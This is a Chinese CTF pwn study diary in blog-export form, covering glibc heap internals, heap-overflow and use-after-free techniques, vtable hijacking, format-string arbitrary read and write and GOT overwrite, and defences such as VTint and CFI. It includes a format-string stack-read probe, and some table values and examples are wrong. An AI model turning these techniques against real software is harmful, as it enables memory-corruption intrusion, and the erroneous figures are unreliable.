name:\");\nfgets(coolguy->fuffer,200,stdin);\ncoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\nputs(\"Input lameguy's name:\");\nfgets(coolguy->fuffer,200,stdin);\ncoolguy->buffer[strcspn(coolguy->buffer,\"\\n\")] = 0;\ncoolguy->message(coolguy->buffer);\nlameguy->message(lameguy->buffer);//<--------被溢出覆盖的函数指针\n```\n\n- 堆溢出有什么其他的利用方法？ \n\n- - 对象中的函数指针\n  - 管理堆的元数据\n  - VTable指针\n\n**溢出一个正在被使用的chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205135042.png\" alt=\"image-20210625205135042\" style=\"zoom:50%;\" />\n\n- 溢出 p bit（prev_in_use） \n\n- - 从0改变成1 \n\n  - - 当这个chunk被free，前一个chunk不会被合并\n    - note：只有被free的chunk比fast-bin-size大时才会发生合并操作\n\n  - 从1改变成0 \n\n  - - 当这个chunk被free时，前一个chunk会被合并\n    - Q1:前一个\"free\"状态chunk的大小？\n    - Q2:什么时候会发生合并？\n    - 如果合并的free       chunk接下来被分配给其他对象，那么两个不同的对象会共享同一段内存\n\n- 溢出 N bit（non_main_arena） \n\n- - 从0改变成1 \n\n  - - 会标志其为non_main_arena，切换arena\n    - 当这个chunk被释放，将会被添加到fastbin或者unsorted_bin\n    - 指向fastbin/unsorted_bin的指针会更新\n\n**溢出一个free chunk**\n\n- 溢出 P bit     （prev_in_use） \n\n- - 从1改变成0 \n\n  - - Q1：如果被分配给对象，P bit会被堆管理器纠正吗？\n    - Q2:如果这个chunk被其他free chunk合并了呢？\n      e.g.：该free chunk之后的chunk被释放，其会尝试向前面的chunk合并，得到一个非预期大小的free chunk\n    - 这个free       chunk可以在稍后分配新的对象，新的对象会和前面的chunk共享内存\n    - Q3:如果这个chunk在bins之间移动？\n\n  - 从0改变成1，前面的free      chunk将不会被合并\n\n  - 被释放的堆快由arena/fastbin追踪记录\n\n  - 被释放的堆快可以在稍后分配给新的对象，或者被新的free chunk合并，或者按照 fastbin->unsorted_bin->smallbin/largebin的顺序移动\t\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205424699.png\" alt=\"image-20210625205424699\" style=\"zoom:50%;\" />\n\n- 溢出 size 区域 \n\n- - 如果该chunk被分配？\n  - 如果该chunk被物理相邻的chunk合并？\n  - 如果这个chunk在bins间移动？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205445914.png\" alt=\"image-20210625205445914\" style=\"zoom:50%;\" />\n\n- 溢出 fd/bk指针 \n\n- - 产生 unlink 问题\n\n- 溢出 prev_size 区域 \n\n- - 如果缩小prev_size \n\n  - - 当下一个chunk被释放时，会发生什么？       \n\n    - - 会尝试合并当前chunk（的一部分）\n      - 当前chunk（的一部分）将被unlink，导致unlink操作到假的fd/bk指针，并且当前        free chunk和合并的chunk重叠。\n\n  - 如果放大prev_size \n\n  - - 当下一个chunk被释放时，会发生什么？       \n\n    - - 会尝试合并当前chunk（大于实际）\n      - （大于实际）的当前堆快将被unlink，导致unlink操作到假的fd/bk指针，并且前面（正在使用）的chunk会和新合并的free        chunk共享内存\n\n**溢出TOP chunk的size区域**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205532518.png\" alt=\"image-20210625205532518\" style=\"zoom:50%;\" />\n\n- 缩小size \n\n- - 浪费内存\n\n- 放大size \n\n- - 新的分配请求总是能被TOP      chunk满足\n  - 这个（比实际大的）TOP      chunk可以覆盖包括 code/data,e.g.,got表，那么任意地址都可以被分配请求返回\n\n**防御堆溢出**\n\n- cookie \n\n- - 与StackGuard/GS（在返回地址附近插入cookie）类似，我们可以在堆对象附近插入cookie。\n\n- 但是 \n\n- - 运行时开销非常大\n\n  - 没有一个好的时间节点进行cookie检查：      \n\n  - - 对于栈，在函数返回时进行检查\n    - 对于堆，一个还算合理的适当malloc/free被调用时进行检查，但其可能无法对被损害的对象进行操作。\n\n**Use-After-Free (UAF)**\n\n- 漏洞 \n\n- - 被释放的内存被再次释放？\n  - 被释放的内存被损坏？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205716558.png\" alt=\"image-20210625205716558\" style=\"zoom:50%;\" />\n\n- 攻击\n  - 最常见的UAF攻击：VTable Hijacking\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205758688.png\" alt=\"image-20210625205758688\" style=\"zoom:50%;\" />\n\n**UAF vulnerability(MS12-063)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205915719.png\" alt=\"image-20210625205915719\" style=\"zoom:50%;\" />\n\n**UAF vulnerability(MS12-063)**<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205933444.png\" style=\"zoom:50%;\" />\n\n**动态分配的VTable(c++)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625205958106.png\" alt=\"image-20210625205958106\" style=\"zoom:50%;\" />\n\n```c++\nvoid foo(Base2* obj){\n    obj->vg4();\n}\nvoid main(){\n    Base2* obj = new Sub();\n    foo(obj);\n}\n```\n\n```assembly\ncode section\n; Function main()\npush SIZE\ncall malloc()\nmov ecx, eax\ncall Sub::Sub()\n; now ECX points to the Sub object\nadd ecx, 8\n; now ECX points to the Sub::Base2 object\ncall foo()\nret\n; Function foo()\nmov eax, [ecx]      ; read vfptr of Base2\nmov edx, [eax+0x0C] ; get vg4() from vtable\ncall edx            ; call Base2::vg4()\nret\n```\n\n**VTable Hijacking 分类**\n\n- 损坏VTable \n\n- - 覆盖VTable\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210119072.png\" alt=\"image-20210625210119072\" style=\"zoom:50%;\" />\n\n- VTable注入 \n\n- - 覆盖vfptr\n  - 指向假的VTable\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210150396.png\" alt=\"image-20210625210150396\" style=\"zoom:50%;\" />\n\n- VTable重用 \n\n- - 覆盖vfptr\n  - 指向包括VTable，数据等\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210205114.png\" alt=\"image-20210625210205114\" style=\"zoom:50%;\" />\n\n**VTable Hijacking 实战**\n\n- Pwn2Own 2014  firefox\n- Pwn2Own 2014  chrome\n- CVE-2014-1772   IE\n\n```assembly\ncode section\n; Function main()\npush SIZE\ncall malloc()\nmov ecx, eax\ncall Sub::Sub()\n; now ECX points to the Sub object\nadd ecx, 8\n; now ECX points to the Sub::Base2 object\ncall foo()\nret\n; Function foo()\nmov eax, [ecx]      ; read vfptr of Base2\nmov edx, [eax+0x0C] ; get vg4() from vtable\ncall edx            ; call Base2::vg4()\nret\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210304071.png\" alt=\"image-20210625210304071\" style=\"zoom:50%;\" />\n\n**防御VTable Hijacking**\n\n**VTint**\n\n| **-**        | **Attack**                      | **Requirement**              |\n| ------------ | ------------------------------- | ---------------------------- |\n| VTable  破坏 | 覆盖  VTable                    | VTable可写                   |\n| VTable  注入 | 覆盖vfptr，指向被注入的VTable   | VTable可写                   |\n| VTable  重用 | 覆盖vfptr，指向包括VTable，数据 | 形似VTable的数据，包括VTable |\n\n| **-**        | **Attack**                      | **Requirement**              | **解决方案**      |\n| ------------ | ------------------------------- | ---------------------------- | ----------------- |\n| VTable  破坏 | 覆盖  VTable                    | VTable可写                   | VTable只读        |\n| VTable  注入 | 覆盖vfptr，指向被注入的VTable   | VTable可写                   | VTable只读        |\n| VTable  重用 | 覆盖vfptr，指向包括VTable，数据 | 形似VTable的数据，包括VTable | 不同的VTable/数据 |\n\n**VTint vs. DEP**\n\n| **-**        | **VTint**         |\n| ------------ | ----------------- |\n| VTable  破坏 | VTable只读        |\n| VTable  注入 | VTable只读        |\n| VTable  重用 | 不同的VTable/数据 |\n\n| **-**        | **DEP**                          |\n| ------------ | -------------------------------- |\n| VTable  破坏 | 只读的代码段                     |\n| VTable  注入 | 只读的代码段(可写的段不会被执行) |\n| VTable  重用 | NO                               |\n\n- 与DEP的相同之处 \n\n- - 轻量级，可以是二进制可兼容的。\n\n- 不同 \n\n- - 加固后，可攻击面更小\n\n**二进制级防护：vfGuard**\n\nNDSS’15: Dynamic binary instrumentation\n\n\\- 在运行时检查虚拟调用指令（使用PIN）\n\n\\- 针对指令使用不同策略\n\n- 优势 \n\n- - 易于扩展，去执行不同策略\n\n- 劣势 \n\n- - 开销大（PIN的开销*118%）\n  - 无法防御VTables重用攻击\n\n**源代码级防护：vfGuard**\n\n- Microsoft IE10,     Core Objects \n\n- - 在VTable结束地方的特殊cookies\n\n- 优势 \n\n- - 轻量级\n\n- 劣势 \n\n- - 只防御核心对象Core      Objects\n  - 不能应付VTable注入\n  - 信息泄漏\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625210454607.png\" alt=\"image-20210625210454607\" style=\"zoom:50%;\" />\n\n**源代码级防护：SafeDispatch**\n\n- NDSS’14, LLVM-based     \n\n- - 静态计算一系列合法目标\n  - 根据计算结果进行动态验证\n\n- 策略1: VTable Check \n\n- - 劣势： \n\n  - - 编译阶段需要耗费大量时间去分析\n    - 高运行时开销（~30%）\n\n- 策略2: moethod Check \n\n- - 劣势： \n\n  - - 编译阶段需要耗费大量时间去分析\n    - 高运行时开销（~7%）\n\n**源代码级防护：Forward Edge CFI**\n\n- GCC-VTV     [Usenix’14], whitelist-based\n\n  \\- 在编译阶段计算一组不完整的合法目标\n  \\- 在加载是通过初始化函数合并不完整的数据\n  \\- 在运行时检验是否合法\n\n- 优势 \n\n- - 支持增量构建\n\n- 劣势 \n\n- - 运行时操作繁琐\n\n**源代码级别的防护：RockJIT**\n\n- CCS’15, CFI-based \n\n- - 在编译阶段收集类型信息\n  - 根据收集到的信息计算加载时转移目标的等价类别\n  - 更新CFI检查，在加载时只允许间接传输到一个等价类\n\n- 优势 \n\n- - 支持增量构造\n\n- 劣势 \n\n- - 加载时开销大\n\n头疼≧ ﹏ ≦~~~\n","slug":"ctfpwn2","published":1,"date":"2021-06-25T09:13:48.779Z","updated":"2021-06-25T13:07:24.319Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9r0006rouv1g1mc0sj","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记2</span><br></pre></td></tr></table></figure>\n\n<p><strong>格式化字符串</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625195611418.png\" alt=\"image-20210625195611418\" style=\"zoom:60%;\" />\n\n<p><strong>格式化占位符</strong></p>\n<p>格式化字符串中的占位符用于指明输出的参数值如何格式化。</p>\n<table>\n<thead>\n<tr>\n<th><strong>字符</strong></th>\n<th><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>n$</td>\n<td>n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。  如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO  C。例：printf(“%2$d %2$#x; %1$d %1$#x”,16,17) 产生”17 0x11; 16  0x10”</td>\n</tr>\n</tbody></table>\n<p> Flags可为0个或多个：</p>\n<table>\n<thead>\n<tr>\n<th><strong>字 符</strong></th>\n<th align=\"left\"><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>+</td>\n<td align=\"left\">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>\n</tr>\n<tr>\n<td>空格</td>\n<td align=\"left\">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td>\n</tr>\n<tr>\n<td>-</td>\n<td align=\"left\">左对齐。缺省情况是右对齐。</td>\n</tr>\n<tr>\n<td>#</td>\n<td align=\"left\">对于’g’与’G’，不删除尾部0以表示精度。对于’f’,  ‘F’, ‘e’, ‘E’, ‘g’, ‘G’, 总是输出小数点。对于’o’, ‘x’, ‘X’, 在非0数值前分别输出前缀0, 0x, and  0X表示数制。</td>\n</tr>\n<tr>\n<td>0</td>\n<td align=\"left\">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(“%2d”,  3)输出” 3”，printf(“%02d”,  3)输出”03”。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。</td>\n</tr>\n</tbody></table>\n<p><strong>格式化占位符</strong></p>\n<p>Length指出浮点型参数或整型参数的长度。可以忽略，或者是下述：</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200440768.png\" alt=\"image-20210625200440768\" style=\"zoom:50%;\" />\n\n<p><strong>漏洞利用</strong></p>\n<ul>\n<li><p>读取数据 </p>\n</li>\n<li><ul>\n<li>%x</li>\n<li>%d</li>\n<li>%s</li>\n</ul>\n</li>\n<li><p>写入数据 </p>\n</li>\n<li><ul>\n<li>%n</li>\n</ul>\n</li>\n</ul>\n<p><strong>读取数据</strong></p>\n<p><strong>$操作符</strong></p>\n<p>读取一个特定的参数</p>\n<p>printf(“%3$s”, 1, “b”, “c”, 4);</p>\n<p>将显示3而不是对应顺序的1。其他例子：</p>\n<ul>\n<li>printf(“%3$d”,1,2,3);，显示3</li>\n<li>printf(“%3$d     %2$d %1$d”,1,2,3);，显示3 2 1</li>\n</ul>\n<p>读取栈上第100个dword数据</p>\n<p>$ python -c “print ‘%100$08x’” | ./print2<br> ffa3cad0</p>\n<p>通过$操作符读取任意地址数据！！！</p>\n<p><strong>写入数据</strong></p>\n<ul>\n<li><p>任意地址任意写</p>\n</li>\n<li><ul>\n<li>任意地址：$控制</li>\n<li>任意值：      %xd通过控制x改变输出的字符个数</li>\n</ul>\n</li>\n<li><p>getshell</p>\n</li>\n<li><ul>\n<li>任意地址任意写——&gt;getshell?</li>\n</ul>\n</li>\n<li><ul>\n<li>覆盖got表！！！</li>\n</ul>\n</li>\n</ul>\n<p><strong>AAR和AAW</strong></p>\n<ul>\n<li>AAR：任意地址读（arbitrary     address read）</li>\n<li>AAW：任意地址写（arbitrary     address write）</li>\n<li>能做到这两点就非常强了，重点是如何拿到shell</li>\n<li>Q：写哪些地址，写什么值进去，可以劫持控制流？</li>\n<li>A：GOT表</li>\n</ul>\n<p><strong>GOT表</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200629787.png\" alt=\"image-20210625200629787\" style=\"zoom:50%;\" />\n\n<p><strong>防御</strong></p>\n<ul>\n<li><p>调用约定 </p>\n</li>\n<li><ul>\n<li>caller将所有参数放在栈上</li>\n<li>callee假设所有参数都在栈上</li>\n</ul>\n</li>\n<li><p>漏洞确实存在，假设caller传的参数和callee期望的参数个数不同</p>\n</li>\n<li><p>解决方案：在caller和callee之间做验证     </p>\n</li>\n<li><ul>\n<li><p>caller一共传了多少参数？ </p>\n</li>\n<li><ul>\n<li>编译器在编译阶段可以知道</li>\n</ul>\n</li>\n<li><p>callee使用了多少参数？ </p>\n</li>\n<li><ul>\n<li>仅在运行时方可知道</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Glibc堆分配机制\"><a href=\"#Glibc堆分配机制\" class=\"headerlink\" title=\"Glibc堆分配机制\"></a><strong>Glibc堆分配机制</strong></h3><p><strong>堆的使用</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>分类</strong></th>\n<th><strong>函数</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>程序员应用</td>\n<td></td>\n</tr>\n<tr>\n<td>libc 函数</td>\n<td>malloc(),  realloc(), free(), brk(), mmap(), munmap()</td>\n</tr>\n<tr>\n<td>内核调用</td>\n<td>brk,  mmap, munmap</td>\n</tr>\n</tbody></table>\n<p><strong>Linux 进程布局</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200833180.png\" alt=\"image-20210625200833180\" style=\"zoom:50%;\" />\n\n<p>没错！又是它o(<em>￣▽￣</em>)ブ！！！</p>\n<p><strong>堆 VS 栈</strong></p>\n<ul>\n<li><p>堆 </p>\n<ul>\n<li>动态分配 </li>\n<li>对象，大缓冲区，结构体… </li>\n</ul>\n</li>\n<li><p>更慢，手动 </p>\n</li>\n<li><ul>\n<li>malloc / calloc /      recalloc / free</li>\n<li>new / delete</li>\n</ul>\n</li>\n<li><p>栈</p>\n</li>\n<li><ul>\n<li>在编译阶段就固定的内存分配</li>\n<li>局部变量，返回地址，函数地址</li>\n</ul>\n</li>\n<li><p>快，自动</p>\n</li>\n<li><ul>\n<li>编译阶段就完成</li>\n<li>抽象出分配/取消分配的概念</li>\n</ul>\n</li>\n</ul>\n<p><strong>堆的实现</strong></p>\n<p>不同的堆实现</p>\n<ul>\n<li>dlmalloc</li>\n<li>ptmalloc (glibc)</li>\n<li>tcmalloc (Chrome,     replaced)</li>\n<li>jemalloc     (Firefox/Facebook)</li>\n<li>nedmalloc</li>\n<li>Hoard</li>\n</ul>\n<p><strong>glibc的堆实现</strong></p>\n<p>chunk<br> 堆的基本单位是一个一个chunk块，chunk的结构如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\">    INTERNAL_SIZE_T    prev_size;     <span class=\"comment\">/* Size of previous chunk (if free).  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T    size;          <span class=\"comment\">/* Size in bytes, including overhead. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>          <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span>                                                                           / * Only used <span class=\"keyword\">for</span> large blocks: pointer to next larger size.  */</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\"> &#125;;</span><br></pre></td></tr></table></figure>\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201205824.png\" alt=\"image-20210625201205824\" style=\"zoom:50%;\" />\n\n<p><strong>chunk size</strong></p>\n<p>为了执行效率，chunk的长度会进行对齐</p>\n<ul>\n<li>32bit： （x + 4）对齐到8</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>data size</strong></th>\n<th><strong>0 ~ 4</strong></th>\n<th><strong>5 ~ 12</strong></th>\n<th><strong>13 ~ 20</strong></th>\n<th><strong>…</strong></th>\n<th><strong>53 ~ 60</strong></th>\n<th><strong>61 ~ 68</strong></th>\n<th><strong>69 ~ 76</strong></th>\n<th><strong>77 ~ 84</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>chunk  size</td>\n<td>16</td>\n<td>16</td>\n<td>24</td>\n<td>…</td>\n<td>64</td>\n<td>72</td>\n<td>80</td>\n<td>88</td>\n</tr>\n</tbody></table>\n<ul>\n<li>64bit： （x + 4）对齐到16</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>data size</strong></th>\n<th><strong>0 ~ 8</strong></th>\n<th><strong>9 ~ 24</strong></th>\n<th><strong>25 ~ 40</strong></th>\n<th><strong>…</strong></th>\n<th><strong>105 ~ 120</strong></th>\n<th><strong>121 ~ 136</strong></th>\n<th><strong>137 ~ 152</strong></th>\n<th><strong>153 ~ 168</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>chunk  size</td>\n<td>32</td>\n<td>32</td>\n<td>24</td>\n<td>…</td>\n<td>64</td>\n<td>72</td>\n<td>80</td>\n<td>88</td>\n</tr>\n</tbody></table>\n<p><strong>In used chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201332771.png\" alt=\"image-20210625201332771\" style=\"zoom:50%;\" />\n\n<ul>\n<li>如果前面的chunk是使用状态，prev_size则属于前一个堆块。</li>\n<li>prev_in_use表明前一个堆块是否free状态（且不在fastbins内）</li>\n<li>is_mmaped说明内存来自于mmap()</li>\n<li>non_main_arena表明该堆块由非主线程分配</li>\n</ul>\n<p><strong>free chunk</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625202247694.png\" alt=\"image-20210625202247694\" style=\"zoom:50%;\" />\n\n<p>如果前面的chunk是空闲状态，prev_size则记录前面chunk的大小。</p>\n<p>下一个堆块的prev_size记录本堆块的大小。</p>\n<p>其中，size不同于pre_size的是，size中的低三位作为flag。</p>\n<ul>\n<li>最低位:前一个 chunk         是否正在使用</li>\n<li>倒数第二位:当前 chunk     是否是通过 mmap 方式产生的</li>\n<li>倒数第三位:这个 chunk     是否属于一个线程的 arena<br>需要注意的是，如果该free chunk落在fastbin中，这些数据将不会被设置。</li>\n</ul>\n<p><strong>chunk</strong></p>\n<ul>\n<li><p>正在被使用的chunk </p>\n</li>\n<li><ul>\n<li>被程序的数据指针指向</li>\n<li>长度是对于chunk本身是可知的</li>\n<li>free()因此得以工作</li>\n</ul>\n</li>\n<li><p>free状态的chunk </p>\n</li>\n<li><ul>\n<li>不再被程序指向</li>\n<li>稍后会被重复使用来回应内存分配</li>\n<li>需要有效的组织管理free  chunk以便于maclloc()来分配</li>\n<li>how？</li>\n</ul>\n</li>\n</ul>\n<p><strong>free chunks的组织管理</strong></p>\n<ul>\n<li><p>链表，通常的，一个链表拥有的chunk长度相同     </p>\n</li>\n<li><ul>\n<li>需要多个链表</li>\n<li>以管理不同长度的chunk</li>\n<li>单链表或双向链表</li>\n<li>链表被分组为几个BINs</li>\n<li>fastbins,unsorted_bin,smallbins,largebins</li>\n</ul>\n</li>\n</ul>\n<p><strong>Arena(32bit)</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203040407.png\" alt=\"image-20210625203040407\" style=\"zoom:50%;\" />\n\n<p><strong>Get Arena</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203114779.png\" alt=\"image-20210625203114779\" style=\"zoom:50%;\" />\n\n<p><strong>fastbin</strong></p>\n<p>管理16bytes-64bytes（64位下为32bytes~128bytes）的chunk的单向链表数据结构，由于需要加速程序执行速度的原因，linux对于fastbin的检查较为松散，因此利用起来也较为方便。</p>\n<ul>\n<li><p>单向链表 </p>\n</li>\n<li><ul>\n<li>特点：快</li>\n<li>释放后的chunk插入fastbin表头</li>\n<li>只使用fd指针，bk指针，pre_size,p bit无效</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203309172.png\" alt=\"image-20210625203309172\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203322743.png\" alt=\"image-20210625203322743\" style=\"zoom:40%;\" />\n\n<p><strong>unsorted_bin</strong></p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li><p>如果搜索到unsorted_bin，对它管理的chunk一一处理      </p>\n</li>\n<li><ul>\n<li>把chunk归放到small/large  bin（唯一增加small/large bin的地方）</li>\n<li>如果长度刚好满足要求，就返回chunk并结束搜索</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li><p>如果free的chunk不能放到fastbin，就放到unsorted_bin。</p>\n</li>\n<li><p>向前面的空闲的chunk合并 </p>\n</li>\n<li><ul>\n<li>通过检查p bit</li>\n</ul>\n</li>\n<li><p>向后面的空闲的chunk合并 </p>\n</li>\n<li><ul>\n<li>通过检查它后一个chunk p       bit</li>\n</ul>\n</li>\n<li><p>设置fd，bk指针，后一个chunk的prev_size,p  bit</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>Small-bins</strong></p>\n<p>small-bins特点：</p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li>如果找到对应长度的chunk，则直接返回</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li>不会直接把chunk放进small-bin</li>\n</ul>\n</li>\n<li><p>fd/bk被设置 </p>\n</li>\n<li><ul>\n<li>当chunk从unsorted_bin删除时。</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203558989.png\" alt=\"image-20210625203558989\" style=\"zoom:50%;\" />\n\n<p><strong>Large-bins</strong></p>\n<ul>\n<li><p>malloc() </p>\n</li>\n<li><ul>\n<li><p>如果large-bin被搜索到 </p>\n</li>\n<li><ul>\n<li>寻找满足要求的最小chunk</li>\n<li>或者分裂大chunk，一份返回给用户，一份加入到unsorted_bin</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>free() </p>\n</li>\n<li><ul>\n<li>不会直接放到large-bin</li>\n</ul>\n</li>\n<li><p>fd/bk, fd_nextsize/bk_nextsize 被设置 </p>\n</li>\n<li><ul>\n<li>当其从unsorted_bin删除时。</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203631401.png\" alt=\"image-20210625203631401\" style=\"zoom:50%;\" />\n\n<p><strong>top chunk</strong></p>\n<p>初次malloc()后，没有被分出去的堆。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203756685.png\" alt=\"image-20210625203756685\" style=\"zoom:50%;\" />\n\n<p><strong>malloc过程</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203823867.png\" alt=\"image-20210625203823867\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>检查长度是否符合fastbin的范围，如果在其中找到，则     </p>\n</li>\n<li><ul>\n<li>将其从单链表删除</li>\n<li>更新fd指针</li>\n</ul>\n</li>\n<li><p>检查长度是否符合smallbins的范围，如果在其中找到，则     </p>\n</li>\n<li><ul>\n<li>从双向链表中删除</li>\n<li>更新fd/bk指针</li>\n</ul>\n</li>\n<li><p>如果尝试分配长度很大的chunk，不直接搜索large-bin，而是进行chunk整理     </p>\n</li>\n<li><ul>\n<li>把fastbin放到unsorted_bin中</li>\n<li>更新下一个chunk的prev_size和p      bit</li>\n<li>合并空闲堆快</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203848532.png\" alt=\"image-20210625203848532\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>在unsorted_bin中搜索 </p>\n</li>\n<li><ul>\n<li>如果last_reminder      cache足够大，就分一块出来</li>\n<li>如果找到合适大小的chunk就返回</li>\n<li>对于搜索的每个chunk，将其按照范围放进small/large      bins</li>\n</ul>\n</li>\n<li><p>更新fd/bk指针</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203902464.png\" alt=\"image-20210625203902464\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>在small/large中搜索 </p>\n</li>\n<li><ul>\n<li><p>在最小的非空small/large      bin中找到足够大的chunk </p>\n</li>\n<li><ul>\n<li>unlink，split</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203923167.png\" alt=\"image-20210625203923167\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>从TOP chunk中获取内存 </p>\n</li>\n<li><ul>\n<li>如果top      chunk足够大，就分一部分出来</li>\n<li>如果没有fastbin就从系统获取内存</li>\n<li>再次整理fastbin和unsorted_bin</li>\n</ul>\n</li>\n</ul>\n<p><strong>free</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203941475.png\" alt=\"image-20210625203941475\" style=\"zoom:50%;\" />\n\n<ul>\n<li><p>检查元数据的安全性 </p>\n</li>\n<li><ul>\n<li>e.g. :      ptr-&gt;fd-&gt;bk == ptr</li>\n</ul>\n</li>\n<li><p>如果大小在fastbin范围内就放到fastbin里面     </p>\n</li>\n<li><ul>\n<li>更新fastbin，fd</li>\n</ul>\n</li>\n<li><p>合并前一个free状态的chunk </p>\n</li>\n<li><ul>\n<li>unlink</li>\n</ul>\n</li>\n<li><p>合并后一个free状态的chunk 